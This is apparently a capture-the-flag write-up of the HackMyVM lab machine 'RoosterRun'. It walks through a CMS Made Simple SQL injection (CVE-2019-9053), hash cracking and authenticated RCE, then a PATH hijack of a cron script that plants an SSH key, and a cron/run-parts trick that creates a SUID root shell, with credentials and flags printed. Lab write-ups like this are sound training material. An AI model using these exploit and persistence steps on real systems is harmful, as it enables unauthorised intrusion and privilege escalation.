# RoosterRun

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.135:22
Open 10.0.2.135:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.135
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOHL4gbzUOgWlMW/HgWpBe3FlvvdyW1IsS+o1NK/YbUOoM3iokvdbkFxXdYjyvzkNpvpCXfldEQwS+BIfEmdtwU=
|   256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC0o8/EYPi0jQMqY1zqXqlKfugpCtjg0i5m3bzbyfqxt
80/tcp open  http    syn-ack Apache httpd 2.4.57 ((Debian))
|_http-generator: CMS Made Simple - Copyright (C) 2004-2023. All rights reserved.
|_http-server-header: Apache/2.4.57 (Debian)
|_http-favicon: Unknown favicon MD5: 551E34ACF2930BF083670FA203420993
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home - Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/roosterrun/writeup.png)

### SQLi

```bash
└─$ searchsploit 'CMS Made Simple 2.2.9.1'
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                               | php/webapps/46635.py
----------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

└─$ searchsploit -p 46635
  Exploit: CMS Made Simple < 2.2.10 - SQL Injection
      URL: https://www.exploit-db.com/exploits/46635
     Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
    Codes: CVE-2019-9053
 Verified: False
File Type: Python script, ASCII text executable
Copied EDB-ID #46635's path to the clipboard
```

```bash
# Python3 Version script
└─$ curl -LOs https://raw.githubusercontent.com/e-renna/CVE-2019-9053/refs/heads/master/exploit.py
└─$ py exploit.py -u http://10.0.2.135/
[+] Salt for password found: 1a0112229fbd699d
[+] Username found: admin
[+] Email found: admin@localhost.com
[+] Password found: 4f943036486b9ad48890b2efbf7735a8
```

```bash
└─$ hashcat -m 20 '4f943036486b9ad48890b2efbf7735a8:1a0112229fbd699d' $rockyou
4f943036486b9ad48890b2efbf7735a8:1a0112229fbd699d:homeandaway
```

::: info Note
`admin:homeandaway`
:::

- Login [http://10.0.2.135/admin/login.php](http://10.0.2.135/admin/login.php)

### RCE

```bash
└─$ searchsploit 'CMS Made Simple RCE'
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution | php/remote/46627.rb
CMS Made Simple 2.2.15 - RCE (Authenticated)                          | php/webapps/49345.txt
CmsMadeSimple v2.2.17 - Remote Code Execution (RCE)                   | php/webapps/51600.txt
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

└─$ searchsploit -p php/webapps/49345.txt
  Exploit: CMS Made Simple 2.2.15 - RCE (Authenticated)
      URL: https://www.exploit-db.com/exploits/49345
     Path: /usr/share/exploitdb/exploits/php/webapps/49345.txt
    Codes: N/A
 Verified: False
File Type: ASCII text
Copied EDB-ID #49345's path to the clipboard
```

![writeup-1.png](/assets/pentest/hackmyvm/roosterrun/writeup-1.png)

## Lateral Movement (www-data)

```bash
www-data@rooSter-Run:/var/www/html$ cat config.php
<?php
# CMS Made Simple Configuration File
# Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference
#
$config['dbms'] = 'mysqli';
$config['db_hostname'] = 'localhost';
$config['db_username'] = 'admin';
$config['db_password'] = 'j42W9kDq9dN9hK';
$config['db_name'] = 'cmsms_db';
$config['db_prefix'] = 'cms_';
$config['timezone'] = 'Europe/Berlin';
```

`su` is unsuccessful with database password.
```bash
www-data@rooSter-Run:/var/www/html$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/usr/bin/zsh
matthieu:x:1000:1000:,,,:/home/matthieu:/bin/zsh
```

```bash
www-data@rooSter-Run:/var/www/html$ find / -user matthieu -ls 2>/dev/null | grep -v oh-my
   263045      4 drwxr-xr-x   4 matthieu matthieu     4096 Dec 11 18:22 /home/matthieu
   263048      4 -rw-r--r--   1 matthieu matthieu      807 Sep 22  2023 /home/matthieu/.profile
   393117      4 -rwxr-xr-x   1 matthieu matthieu      302 Sep 23  2023 /home/matthieu/StaleFinder
   264619      4 drwxr-xr-x   3 matthieu matthieu     4096 Sep 22  2023 /home/matthieu/.local
   264622      4 drwx------   3 matthieu matthieu     4096 Sep 22  2023 /home/matthieu/.local/share
   261643      4 -rwx------   1 matthieu matthieu       33 Sep 24  2023 /home/matthieu/user.txt
   263049      4 -rw-r--r--   1 matthieu matthieu      220 Sep 22  2023 /home/matthieu/.bash_logout
   263050      4 -rw-r--r--   1 matthieu matthieu     3915 Sep 22  2023 /home/matthieu/.zshrc
   264616      4 -rw-r--r--   1 matthieu matthieu     3526 Sep 22  2023 /home/matthieu/.bashrc
www-data@rooSter-Run:/var/www/html$ cat /home/matthieu/StaleFinder
#!/usr/bin/env bash

for file in ~/*; do
    if [[ -f $file ]]; then
        if [[ ! -s $file ]]; then
            echo "$file is empty."
        fi

        if [[ $(find "$file" -mtime +365 -print) ]]; then
            echo "$file hasn't been modified for over a year."
        fi
    fi
done
```

Looks like a cronjob.

No permissions to write in their directory.
```bash
www-data@rooSter-Run:/home/matthieu$ echo x > x
bash: x: Permission denied
```

`/usr/local/bin` is writable!
```bash
www-data@rooSter-Run:/home/matthieu$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
www-data@rooSter-Run:/home/matthieu$ find /usr/local -writable -ls 2>/dev/null
   915413      4 drwxrwx---   2 root     root         4096 Sep 24  2023 /usr/local/bin
```

Generate ssh keys
```bash
└─$ ssh-keygen -f id_rsa -P x -q
└─$ echo "mkdir ~/.ssh; echo '$(cat id_rsa.pub)' >> ~/.ssh/authorized_keys"
mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDgydOS5+6UgZxNhFBqU+a4uiIwmYGBqjCQuFkJkNt5e woyag@kraken' >> ~/.ssh/authorized_keys
```

Add yourself to SSH
```bash
www-data@rooSter-Run:/home/matthieu$ echo "mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDgydOS5+6UgZxNhFBqU+a4uiIwmYGBqjCQuFkJkNt5e woyag@kraken' >> ~/.ssh/authorized_keys" > /usr/local/bin/bash
www-data@rooSter-Run:/home/matthieu$ chmod +x /usr/local/bin/bash
```

## SSH (matthieu)

```bash
└─$ ssh -i id_rsa matthieu@10.0.2.135
╰─$ id
uid=1000(matthieu) gid=1000(matthieu) groups=1000(matthieu),100(users)
```

### User.txt

```bash
╰─$ cat user.txt
32af3c9a9cb2fb748aef29457d8cff55
```

## Privilege Escalation (root)

More cronjobs
```bash
╭─matthieu@rooSter-Run /opt/maintenance
╰─$ find -L . -ls
   130562      4 drwxr-xr-x   4 root     root         4096 Sep 24  2023 .
   130565      4 -rwxr-xr-x   1 root     root          367 Sep 20  2023 ./backup.sh
   130564      4 drwx---rwt   2 root     root         4096 Sep 24  2023 ./pre-prod-tasks
   130561      4 drwx---rwx   2 root     root         4096 Sep 24  2023 ./prod-tasks
```

```bash
╰─$ cat backup.sh
#!/bin/bash

PROD="/opt/maintenance/prod-tasks"
PREPROD="/opt/maintenance/pre-prod-tasks"

for file in "$PREPROD"/*; do
  if [[ -f $file && "${file##*.}" = "sh" ]]; then
    cp "$file" "$PROD"
  else
    rm -f ${file}
  fi
done

for file in "$PROD"/*; do
  if [[ -f $file && ! -O $file ]]; then
  rm ${file}
  fi
done

/usr/bin/run-parts /opt/maintenance/prod-tasks
```

```bash
╰─$ man run-parts
NAME
       run-parts - run scripts or programs in a directory

DESCRIPTION
       run-parts runs all the executable files named within constraints described below, found in directory directory.  Other files and directories are silently ignored.

       If  neither the --lsbsysinit option nor the --regex option is given then the names must consist entirely of ASCII upper- and lower-case letters, ASCII digits, ASCII underscores, and ASCII minus-hy‐phens.
```

The script only copies files that end with `.sh`, however `run-parts` doesn't like `.` symbol so the script will not be ran. We can directly write to `prod-tasks`, but it will get deleted because of UID check.
```bash
╰─$ echo $'#!/bin/bash\ninstall -m4777 /bin/bash /tmp/rootbash' > prod-tasks/letmein
╰─$ chmod +x prod-tasks/letmein
```

We can stage the files with script itself. First it will copy, then since we have permissions on directory we can rename the file and get code execution.
```bash
╰─$ echo $'#!/bin/bash\ninstall -m4777 /bin/bash /tmp/rootbash' > pre-prod-tasks/letmein.sh
╰─$ chmod +x pre-prod-tasks/letmein.sh
# Wait for cronjob to copy
╰─$ mv prod-tasks/letmein.sh prod-tasks/letmein
# Wait for cronjob to execute
```

```bash
╭─matthieu@rooSter-Run /opt/maintenance
╰─$ /tmp/rootbash -p
rootbash-5.2# id
uid=1000(matthieu) gid=1000(matthieu) euid=0(root) groups=1000(matthieu),100(users)
```

### Root.txt

```bash
rootbash-5.2# cat /root/root.txt
670ff72e9d8099ac39c74c080348ec17
```